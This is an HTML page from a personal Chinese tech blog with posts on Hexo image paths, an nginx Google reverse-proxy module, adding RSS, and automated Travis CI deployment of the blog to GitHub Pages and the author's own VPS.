class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-01T10:55:26+08:00">2018-03-01</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/技术/" itemprop="url" rel="index"><span itemprop="name">技术</span></a></span></span> <span class="post-meta-divider">|</span><span class="post-wordcount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">字数统计&#58;</span> <span title="字数统计">268</span></span></div></header><div class="post-body" itemprop="articleBody"><h2 id="绝对路径"><a href="#绝对路径" class="headerlink" title="绝对路径"></a>绝对路径</h2><p>当Hexo项目中只用到少量图片时，可以将图片统一放在<code>source/images</code>文件夹中，通过markdown语法访问它们。</p><p><code>source/images/image.jpg</code></p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="selector-attr">[]</span>(/images/image.jpg)</span><br></pre></td></tr></table></figure><p>图片既可以在首页内容中访问到，也可以在文章正文中访问到。</p><h2 id="相对路径"><a href="#相对路径" class="headerlink" title="相对路径"></a>相对路径</h2><p>图片除了可以放在统一的images文件夹中，还可以放在文章自己的目录中。文章的目录可以通过配置_config.yml来生成。</p><p><code>_config.yml</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>将<code>_config.yml</code>文件中的配置项post_asset_folder设为true后，执行命令<code>$ hexo new post_name</code>，在<code>source/_posts</code>中会生成文章post_name.md和同名文件夹post_name。将图片资源放在post_name中，文章就可以使用相对路径引用图片资源了。</p><p><code>_posts/post_name/image.jpg</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="selector-attr">[]</span>(<span class="selector-tag">image</span><span class="selector-class">.jpg</span>)</span><br></pre></td></tr></table></figure><p>上述是markdown的引用方式，图片只能在文章中显示，但无法在首页中正常显示。</p><p>如果希望图片在文章和首页中同时显示，可以使用标签插件语法。</p><p><code>_posts/post_name/image.jpg</code></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="symbol">%</span> asset_img <span class="built_in">image</span>.jpg This <span class="built_in">is</span> an <span class="built_in">image</span> <span class="symbol">%</span>&#125;</span><br></pre></td></tr></table></figure></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://www.love4026.org/316008/nginx-proxy-module-ngx-http-google-filter-module/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Ray Chang"><meta itemprop="description" content="Think Difficulty"><meta itemprop="image" content="/logo.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ray's Blog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/316008/nginx-proxy-module-ngx-http-google-filter-module/" itemprop="url">nginx 反向代理Google扩展 ngx_http_google_filter_module</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-01T10:29:20+08:00">2018-03-01</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/技术/" itemprop="url" rel="index"><span itemprop="name">技术</span></a></span></span> <span class="post-meta-divider">|</span><span class="post-wordcount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">字数统计&#58;</span> <span title="字数统计">470</span></span></div></header><div class="post-body" itemprop="articleBody"><p>Github上面的一个项目 <a href="https://github.com/cuber/ngx_http_google_filter_module" target="_blank" rel="noopener">Nginx Module for Google</a> ，可以实现快捷部署Google镜像。</p><h2 id="重新编绎Nginx"><a href="#重新编绎Nginx" class="headerlink" title="重新编绎Nginx"></a>重新编绎Nginx</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@AY1407181147267575e9Z ~]<span class="comment"># nginx -V</span></span><br><span class="line">nginx <span class="keyword">version</span>: nginx/1.6.0</span><br><span class="line">built by gcc 4.4.7 20120313 <span class="params">(Red Hat 4.4.7-4)</span> <span class="params">(GCC)</span> </span><br><span class="line">TLS SNI support enabled</span><br><span class="line">configure arguments: <span class="params">--user=www</span> <span class="params">--group=www</span> <span class="params">--prefix=/usr/local/nginx</span> <span class="params">--with-http_stub_status_module</span> <span class="params">--with-http_ssl_module</span> <span class="params">--with-http_gzip_static_module</span> <span class="params">--with-ipv6</span></span><br></pre></td></tr></table></figure><p>我使用的是lnmp.org的一键安装包，其它情形查看 <a href="https://github.com/cuber/ngx_http_google_filter_module" target="_blank" rel="noopener">https://github.com/cuber/ngx_http_google_filter_module</a> ,上面有详细的说明。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="string">//github.com/cuber/ngx_http_google_filter_module</span></span><br><span class="line">git clone https:<span class="string">//github.com/yaoweibin/ngx_http_substitutions_filter_module</span></span><br><span class="line"><span class="keyword">cd</span> nginx-1.6.0/</span><br><span class="line"><span class="string">./configure</span> <span class="params">--user=www</span> <span class="params">--group=www</span> <span class="params">--prefix=/usr/local/nginx</span> <span class="params">--with-http_stub_status_module</span>  \</span><br><span class="line"><span class="params">--with-http_ssl_module</span> <span class="params">--with-http_gzip_static_module</span> <span class="params">--with-ipv6</span> \</span><br><span class="line"><span class="params">--add-module=</span><span class="string">../ngx_http_google_filter_module</span> \</span><br><span class="line"><span class="params">--add-module=</span><span class="string">../ngx_http_substitutions_filter_module</span></span><br><span class="line"></span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">ln -s <span class="string">/usr/local/nginx/sbin/nginx</span> <span class="string">/usr/bin/nginx</span></span><br><span class="line">nginx -t</span><br><span class="line">service nginx restart</span><br></pre></td></tr></table></figure><h2 id="虚拟主机配置"><a href="#虚拟主机配置" class="headerlink" title="虚拟主机配置"></a>虚拟主机配置</h2><p><code>vi /usr/local/nginx/conf/vhost/demo.website.com.conf</code>, 保持内容如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https的可以使用lnmp的脚本配置，在添加虚拟主机的时候有提示是否使用ssl</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl http2;</span><br><span class="line">    <span class="attribute">server_name</span> demo.website.com;</span><br><span class="line">    <span class="attribute">ssl_certificate</span> /usr/local/nginx/conf/ssl/demo.website.com.crt;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /usr/local/nginx/conf/ssl/demo.website.com.key;</span><br><span class="line">    <span class="attribute">ssl_session_timeout</span> <span class="number">10m</span>;</span><br><span class="line">    <span class="attribute">ssl_protocols</span> TLSv1 TLSv1.<span class="number">1</span> TLSv1.<span class="number">2</span>;</span><br><span class="line">    <span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">ssl_ciphers</span> CHACHA20:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-RC4-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA:RC4-SHA:!aNULL:!eNULL:!EXPORT:!DES:!3DES:!MD5:!DSS:!PKS;</span><br><span class="line">    <span class="attribute">ssl_session_cache</span> builtin:<span class="number">1000</span> shared:SSL:<span class="number">10m</span>;</span><br><span class="line">    <span class="attribute">resolver</span> <span class="number">8.8.8.8</span> <span class="number">8.8.4.4</span> valid=<span class="number">300s</span>;</span><br><span class="line">    <span class="attribute">resolver_timeout</span> <span class="number">5s</span>;</span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">google</span> <span class="literal">on</span>;</span><br><span class="line">        <span class="attribute">google_scholar</span> <span class="literal">on</span>;  <span class="comment"># google_scholar 依赖于 google, 所以 google_scholar 无法独立使用。由于谷歌学术近日升级, 强制使用 https 协议, 并且 ncr 已经支持, 所以不再需要指定谷歌学术的 tld</span></span><br><span class="line">        <span class="attribute">google_language</span> en;  <span class="comment"># 语言偏好，默认使用 zh-CN (中文)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> demo.website.com;</span><br><span class="line">    <span class="attribute">rewrite</span><span class="regexp"> ^(.*)$</span> https://<span class="variable">$host</span><span class="variable">$1</span> <span class="literal">permanent</span>; <span class="comment"># 访问http跳转至https</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存配置文件，重启nginx即可。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://github.com/cuber/ngx_http_google_filter_module" target="_blank" rel="noopener">Nginx Module for Google</a></p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://www.love4026.org/316002/my-new-blog-2018/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Ray Chang"><meta itemprop="description" content="Think Difficulty"><meta itemprop="image" content="/logo.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ray's Blog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/316002/my-new-blog-2018/" itemprop="url">重新整理下我的个人博客</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-28T16:22:13+08:00">2018-02-28</time></span> <span class="post-meta-divider">|</span><span class="post-wordcount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">字数统计&#58;</span> <span title="字数统计">437</span></span></div></header><div class="post-body" itemprop="articleBody"><p>昨天把个人博客迁移到github pages上面了，今天把博客主题重新整理了下。</p><p>这个博客从10年到今年，有8年时间了，最近一年因为域名过期，一直也没有整理它，今天把它弄好了，过几天再把之前的域名申请好，然后就可以上线了，未来准备换个域名，时间久了，人也变化很多，等这个域名的权重转移好之后，就可以更换了。</p><p>此博客重新上线，放到了github.com上面一份，VPS上面一份，使用了travis自动发布，由于国内域名需要备案，要在国内畅通打开还需要一段时间。</p><p>博客涉及到诸多技术问题，有想了解的，可以到<a href="https://github.com/sbmzhcn/sbmzhcn.github.io/tree/source" target="_blank" rel="noopener">我的github页面</a>去查看源码，不是特别难，但第一次部署比较麻烦。</p><h2 id="博客添加RSS功能"><a href="#博客添加RSS功能" class="headerlink" title="博客添加RSS功能"></a>博客添加RSS功能</h2><h3 id="安装RSS插件"><a href="#安装RSS插件" class="headerlink" title="安装RSS插件"></a>安装RSS插件</h3><p><code>npm install hexo-generator-feed --save</code></p><h3 id="开启网站-RSS-支持"><a href="#开启网站-RSS-支持" class="headerlink" title="开启网站 RSS 支持"></a>开启网站 RSS 支持</h3><p>编辑网站根目录下的 _config.yml，添加以下代码开启</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># RSS订阅支持</span></span><br><span class="line"><span class="symbol">plugin:</span></span><br><span class="line">- hexo-generator-feed</span><br><span class="line"></span><br><span class="line"><span class="meta"># Feed Atom</span></span><br><span class="line"><span class="symbol">feed:</span></span><br><span class="line"><span class="symbol">type:</span> atom</span><br><span class="line"><span class="symbol">path:</span> atom.xml</span><br><span class="line"><span class="symbol">limit:</span> <span class="number">20</span></span><br></pre></td></tr></table></figure><h3 id="主题开启-RSS-支持"><a href="#主题开启-RSS-支持" class="headerlink" title="主题开启 RSS 支持"></a>主题开启 RSS 支持</h3><p>主题不同开启方法不同，我的是 NexT 主题，默认就可以；其他主题请参考主题说明。</p><h3 id="生成-RSS"><a href="#生成-RSS" class="headerlink" title="生成 RSS"></a>生成 RSS</h3><p>执行 hexo clean &amp;&amp; hexo g重新生成博客文件完成部署即可。 转载请注明出处，本文采用 CC4.0 协议授权</p><h2 id="头像生成地址"><a href="#头像生成地址" class="headerlink" title="头像生成地址"></a>头像生成地址</h2><p><a href="https://faceyourmanga.com" target="_blank" rel="noopener">https://faceyourmanga.com</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://reuixiy.github.io/technology/computer/computer-aided-art/2017/06/09/hexo-next-optimization.html" target="_blank" rel="noopener">https://reuixiy.github.io/technology/computer/computer-aided-art/2017/06/09/hexo-next-optimization.html</a><br><a href="https://github.com/willin/hexo-wordcount" target="_blank" rel="noopener">https://github.com/willin/hexo-wordcount</a><br><a href="https://www.tiexo.cn/gitment/" target="_blank" rel="noopener">体验GitHub Issues的评论系统——Gitment</a><br><a href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="noopener">https://github.com/iissnan/hexo-theme-next</a><br><a href="http://saili.science/2017/04/02/github-for-win/" target="_blank" rel="noopener">http://saili.science/2017/04/02/github-for-win/</a></p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://www.love4026.org/316000/deploy-hexo-blog-to-git-and-vps-auto-with-travis/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Ray Chang"><meta itemprop="description" content="Think Difficulty"><meta itemprop="image" content="/logo.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ray's Blog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/316000/deploy-hexo-blog-to-git-and-vps-auto-with-travis/" itemprop="url">使用 TRAVIS 自动部署 HEXO 到 GITHUB 与 自己的VPS服务器</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-28T12:15:47+08:00">2018-02-28</time></span> <span class="post-meta-divider">|</span><span class="post-wordcount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">字数统计&#58;</span> <span title="字数统计">1,237</span></span></div></header><div class="post-body" itemprop="articleBody"><p>使用 TRAVIS 自动部署 HEXO 到 GITHUB 与 自己的服务器</p><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>请尽可能用比较新的 RubyGems 版本，建议 2.6.x 以上。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gem update --system <span class="comment"># 这里请翻墙一下</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gem -v</span></span><br><span class="line">2.6.3</span><br></pre></td></tr></table></figure><p>使用国内镜像</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ gem sources --<span class="built_in">add</span> http<span class="variable">s:</span>//gems.<span class="keyword">ruby</span>-china.org/ --<span class="built_in">remove</span> http<span class="variable">s:</span>//rubygems.org/</span><br><span class="line">$ gem sources -<span class="keyword">l</span></span><br><span class="line">http<span class="variable">s:</span>//gems.<span class="keyword">ruby</span>-china.org</span><br><span class="line"># 确保只有 gems.<span class="keyword">ruby</span>-china.org</span><br></pre></td></tr></table></figure><p>参考： <a href="https://gems.ruby-china.org/" target="_blank" rel="noopener">https://gems.ruby-china.org/</a></p><h2 id="安装travis"><a href="#安装travis" class="headerlink" title="安装travis"></a>安装travis</h2><p><code>sudo gem install travis</code></p><h2 id="配置github"><a href="#配置github" class="headerlink" title="配置github"></a>配置github</h2><p>我的github之前已经配置好GitHub Pages，现在需要变成下面这样，之前只有master一个分支。</p><ul><li>master 存放 Hexo 生成好的静态文件，所有 commit 信息格式均为 <code>Site updated: %Y-%m-%d %H:%M:%S</code>；</li><li>source 存放 scaffolds（脚手架）、source（文章 Markdown 源码）、_config.yml（Hexo 配置）等文件，并设置为 repo 的默认分支。</li></ul><h2 id="配置-Travis-CI"><a href="#配置-Travis-CI" class="headerlink" title="配置 Travis CI"></a>配置 Travis CI</h2><ul><li>使用github帐号登录Travis，右上方按钮点击同步项目，下方打开需要集成的项目，最后点击齿轮进入项目配置页面</li><li>打开Build only if .travis.yml is present</li></ul><p>参考这篇文章 <a href="https://segmentfault.com/a/1190000009054888" target="_blank" rel="noopener">https://segmentfault.com/a/1190000009054888</a></p><h2 id="通过命令行登录-Travis-并加密文件："><a href="#通过命令行登录-Travis-并加密文件：" class="headerlink" title="通过命令行登录 Travis 并加密文件："></a>通过命令行登录 Travis 并加密文件：</h2><p>在hexo blog项目根目录下创建一个文件 <code>.travis.yml</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd 博客根目录</span><br><span class="line">touch <span class="selector-class">.travis</span><span class="selector-class">.yml</span></span><br><span class="line"></span><br><span class="line">#创建一个文件夹.travis</span><br><span class="line">mkdir .travis</span><br></pre></td></tr></table></figure><p>生成一个 ssh 密钥对（不要嫌麻烦直接把你机器上的秘钥拿去用了，太危险）：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> 博客根目录</span><br><span class="line"><span class="keyword">cd</span> <span class="string">.travis/</span></span><br><span class="line"><span class="comment"># 会生成traivs.key 和travis.key.pub</span></span><br><span class="line">$ ssh-keygen -f travis.key</span><br></pre></td></tr></table></figure><p>然后把生成的公钥文件（e.g. travis.key.pub）分别添加到 GitHub Deploy Keys、VPS 上的 ~/.ssh/authorized_keys 中，这样 Travis CI 的机器就可以直接访问这些服务器了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd 博客根目录</span><br><span class="line">cd .travis/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 交互式操作，使用 GitHub 账号密码登录</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果是私有项目要加个 --pro 参数</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> travis login --auto</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 加密完成后会在当前目录下生成一个 travis.key.enc 文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 还会在你的 .travis.yml 文件里自动加上用于解密的 shell 语句</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> travis encrypt-file travis.key -add</span></span><br></pre></td></tr></table></figure><p>以上步骤完成后你会得到一个 travis.key.enc</p><h2 id="编辑-travis-yml"><a href="#编辑-travis-yml" class="headerlink" title="编辑 .travis.yml"></a>编辑 .travis.yml</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd 博客根目录</span><br><span class="line">vi <span class="selector-class">.travis</span><span class="selector-class">.yml</span></span><br></pre></td></tr></table></figure><p>这是我的配置文件</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">language</span>: node_js</span><br><span class="line"><span class="attribute">node_js</span>: stable</span><br><span class="line"></span><br><span class="line"># 只监听 source 分支的改动</span><br><span class="line"><span class="attribute">branches:</span></span><br><span class="line">  only:</span><br><span class="line">  - source</span><br><span class="line"></span><br><span class="line"># 缓存依赖，节省持续集成时间</span><br><span class="line"><span class="attribute">cache:</span></span><br><span class="line">  yarn: true</span><br><span class="line">  <span class="attribute">directories:</span></span><br><span class="line">    - node_modules</span><br><span class="line">    # - themes</span><br><span class="line"></span><br><span class="line"><span class="attribute">before_install:</span></span><br><span class="line"># 解密 RSA 私钥并设置为本机 ssh 私钥</span><br><span class="line">- openssl aes-256-cbc -K $encrypted_9aab6d74e2ca_key -iv $encrypted_9aab6d74e2ca_iv </span><br><span class="line">  -in .travis/travis.key.enc -out ~/.ssh/id_rsa -d</span><br><span class="line">- chmod 600 ~/.ssh/id_rsa</span><br><span class="line"># 修改本机 ssh 配置，防止秘钥认证过程影响自动部署</span><br><span class="line">#- mv -fv .travis/ssh-config ~/.ssh/config #这一步不需要，如果添加了ssh_know_hosts</span><br><span class="line">- git config --global user.name "sbmzhcn"</span><br><span class="line">- git config --global user.email "sbmzhcn@gmail.com"</span><br><span class="line"># 赋予自动部署脚本可执行权限</span><br><span class="line">- chmod +x .travis/deploy.sh</span><br><span class="line"></span><br><span class="line"><span class="attribute">install:</span></span><br><span class="line"># 安装 Hexo 及其依赖</span><br><span class="line">- yarn</span><br><span class="line"># 当 Travis 文件缓存不存在时，从 Gitee 私有仓库 clone 主题</span><br><span class="line">#- if [ ! -d "themes/next" ]; then git clone git@github.com:sbmzhcn/hexo-theme-next.git themes/next; fi</span><br><span class="line"></span><br><span class="line"><span class="attribute">script:</span></span><br><span class="line"># 生成静态页面</span><br><span class="line">- node_modules/.bin/hexo clean</span><br><span class="line">- node_modules/.bin/hexo generate</span><br><span class="line"></span><br><span class="line"><span class="attribute">after_success:</span></span><br><span class="line"># 部署到 GitHub Pages 和 VPS</span><br><span class="line">- .travis/deploy.sh</span><br><span class="line"></span><br><span class="line"><span class="attribute">addons:</span></span><br><span class="line">  ssh_know_hosts:</span><br><span class="line">  - github.com</span><br><span class="line">  - love4026.org</span><br></pre></td></tr></table></figure><p><code>vi .travis/deploy.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">set</span> -ev</span><br><span class="line"><span class="built_in">export</span> TZ=<span class="string">'Asia/Shanghai'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 rsync同步到 VPS</span></span><br><span class="line">rsync -rv --delete -e <span class="string">'ssh -o stricthostkeychecking=no -p 22'</span> public/ root@182.92.100.67:/home/wwwroot/love4026.org</span><br><span class="line"></span><br><span class="line"><span class="comment"># 先 clone 再 commit，避免直接 force commit</span></span><br><span class="line">git <span class="built_in">clone</span> -b master git@github.com:sbmzhcn/sbmzhcn.github.io.git .deploy_git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> .deploy_git</span><br><span class="line">git checkout master</span><br><span class="line">mv .git/ ../public/</span><br><span class="line"><span class="built_in">cd</span> ../public</span><br><span class="line"></span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">"Site updated: `date +"</span>%Y-%m-%d %H:%M:%S<span class="string">"`"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 同时 push 一份到自己的服务器上</span></span><br><span class="line"><span class="comment">#git remote add vps git@love4026.org:hexo.git</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#git push vps master:master --force --quiet</span></span><br><span class="line">git push origin master:master --force --quiet</span><br></pre></td></tr></table></figure><h2 id="删除一些文件"><a href="#删除一些文件" class="headerlink" title="删除一些文件"></a>删除一些文件</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd 博客根目录/.travis/</span><br><span class="line">rm travis.key</span><br><span class="line">rm travis<span class="selector-class">.key</span><span class="selector-class">.pub</span></span><br></pre></td></tr></table></figure><p>由于我之前有github pages内容了，我需要把之前的内容与现有的hexo博客内容合并下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line">git remote add origin git@github<span class="selector-class">.com</span>:sbmzhcn/sbmzhcn<span class="selector-class">.github</span><span class="selector-class">.io</span><span class="selector-class">.git</span></span><br><span class="line">git fetch origin master:temp</span><br><span class="line">git merge temp</span><br></pre></td></tr></table></figure><p>编辑下.gitignore 忽略一些文件</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.log</span><br><span class="line">node_modules/</span><br><span class="line">public/</span><br><span class="line">.deploy*/</span><br><span class="line">package-lock.json</span><br><span class="line">wordpress.xml</span><br><span class="line">public/</span><br></pre></td></tr></table></figure><h2 id="最终测试"><a href="#最终测试" class="headerlink" title="最终测试"></a>最终测试</h2><p>每次 push 新 commit 到 source 分支后，Travis CI 就会自动帮你构建最新的静态博客，并部署至 Github Pages 和你自己的 VPS 上。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout --orphan <span class="keyword">source</span></span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">"Travis CI"</span></span><br><span class="line">git <span class="keyword">push</span> origin <span class="keyword">source</span>:<span class="keyword">source</span></span><br></pre></td></tr></table></figure><p>关于 –orphan 请参考 <a href="https://ihower.tw/blog/archives/5691" target="_blank" rel="noopener">如何建立一个没有 Parent 的独立 Git branch</a></p><h2 id="我的博客项目配置文件"><a href="#我的博客项目配置文件" class="headerlink" title="我的博客项目配置文件"></a>我的博客项目配置文件</h2><pre><code>https://github.com/sbmzhcn/sbmzhcn.github.io/tree/source
